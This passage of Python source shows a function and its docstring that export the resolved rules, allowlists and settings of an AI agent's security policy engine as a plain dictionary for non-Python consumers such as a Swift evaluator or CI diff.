    Non-Python consumers (a GUI agent's Swift evaluator, a CI diff) otherwise
    have to re-implement the merge — defaults + project/remote overrides,
    add_patterns/disable_patterns, enabled: false — from this module's source,
    and that reimplementation drifts silently. This emits what the engine
    actually resolved, so there is nothing left to re-derive: patterns are the
    post-customization set, disabled rules are absent rather than flagged, and
    event_types carry the untrusted-content aliases the loader folded in.

    Lists are sorted only where their order carries no meaning; pattern order is
    preserved because it is the order findings report a match in.

    A rule's ``fields`` stays as declared (often empty) and the canonical
    per-event-type defaults ship alongside as ``default_fields``. Collapsing the
    two would be a lie for a rule spanning several event types: the fallback is
    resolved per *event*, so the same rule checks ``command`` on a shell event
    and ``path`` on a file one.
    """
    return {
        "version": "1.0",
        "default_fields": {k: list(v) for k, v in _DEFAULT_FIELDS.items()},
        "settings": {
            "default_mode": engine.default_mode,
            "device_mode": engine.device_mode,
            "block_categories": sorted(engine.block_categories),
            "egress_allowlist": list(engine.egress_allowlist),
            "mcp_transport_action": engine.mcp_transport_action,
            "supply_chain_install_check": engine.supply_chain_install_check,
            "supply_chain_transitive_scan": engine.supply_chain_transitive_scan,
            "semantic_guard": engine.semantic_guard_config,
            "sandbox": engine.sandbox_config,
            "tool_tags": engine.tool_tags,
        },
        "rules": [
            {
                "id": rule.id,
                "severity": rule.severity,
                "category": rule.category,
                "title": rule.title,
                "event_types": sorted(rule.event_types),
                "fields": list(rule.fields),
                "patterns": list(rule.raw_patterns),
                "action": rule.action,
                "transform": rule.transform,
                "mode": rule.mode,
                "severity_on_write": rule.severity_on_write,
                "severity_on_manifest": rule.severity_on_manifest,
            }
            for rule in sorted(engine.rules, key=lambda r: r.id)
        ],
        "allowlists": [
            {
                "id": entry.id,
                "type": entry.type,
                "rule_ids": sorted(entry.rule_ids),
                "patterns": list(entry.raw_patterns),
                "reason": entry.reason,
            }
            for entry in sorted(engine.allowlists, key=lambda e: e.id)
        ],
    }
